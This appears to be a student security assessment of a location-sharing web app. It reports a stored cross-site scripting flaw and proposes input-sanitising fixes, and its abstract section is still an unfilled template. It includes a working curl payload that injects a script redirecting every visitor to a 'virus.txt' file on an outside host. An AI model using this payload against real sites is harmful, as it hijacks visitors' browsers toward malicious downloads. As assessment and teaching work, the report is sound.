</header>

<h3>Introduction</h3>
<p>The product is a web application that upon visiting, displays a google map of the user's location and the locations of nearby users and landmarks within a mile. I was hired to identify security vulnerabilities of the application.</p>

<h3>Methodology</h3>
<p>To test, I wrote practice scripts in a scrap html file, used curl to send purposefully untrustworthy data to the server, and managed the manually inserted test entries from the mLab website.</p>

<h3>Abstract of Findings</h3>
<p>(Provide an overview of all the security and privacy issues you identified. This section should be written for non-technical managers who do not have technical expertise and do not have time to read the entire document. Write this section using lay language.)</p>

<h3>Issues Found</h3>
<ol>
<li>Issue: Cross-site scripting
	<ul>
	<li>Location of issue: Parsing post parameters sent to server (index.js, line 90)</li>
	<li>Severity of issue: High. May lead to issues such as downloading unwanted viral content, as shown below.</li>
	<li>Description of issue: The string login parameter stored in the database isn't parsed before being stored in the database, allowing for html script injections. For example, when I send the following to the server:
		<p><pre>curl --data "login=&lt;script&gt; document.location.href = 'https://raw.githubusercontent.com/tuftsdev/comp20-jyang/master/security/examples/virus.txt?token=Ac8Ju3YoSwLSPnt2T127XWdADCoewghzks5aNFSdwA%3D%3D'; &lt;/script&gt;&amp;lat=0&amp;lng=0" https://stark-journey-75501.herokuapp.com/sendLocation</pre></p>
	accessing <a href="https://stark-journey-75501.herokuapp.com/">https://stark-journey-75501.herokuapp.com/</a> will cause an automatic redirect to opening the file "virus.txt" in the browser. If the file was a .exe file instead, or any file that's automatically downloaded if it can't be opened in a browser window, serious harm could be caused.
	</li>
	<li>Proof of vulnerability:
		<p><img src="examples/xss-data.png" alt="storage of untrusted data in mongodb logins database" /></p>
		<p><img src="examples/xss-redirect.png" alt="redirected page due to cross-site script" /></p>
	</li>
	<li>Resolution: This issue can be alleviated by removing all special characters from the string login input by replacing index.js line 90 with:
		<p><pre>var login = request.body.login.replace(/[^\w\s]/gi, '');</pre></p>
	Another solution that preserves the special characters is to html encode the string login input before storing in the database, which can be done with the npm htmlencode package detailed <a href="https://www.npmjs.com/package/htmlencode">here</a>.</li>

<h3>Conclusion</h3>
<p>Clearly, you can never trust user input, so if the application needs to take in user input, safeguards are necessary to strip it of danger.</p>
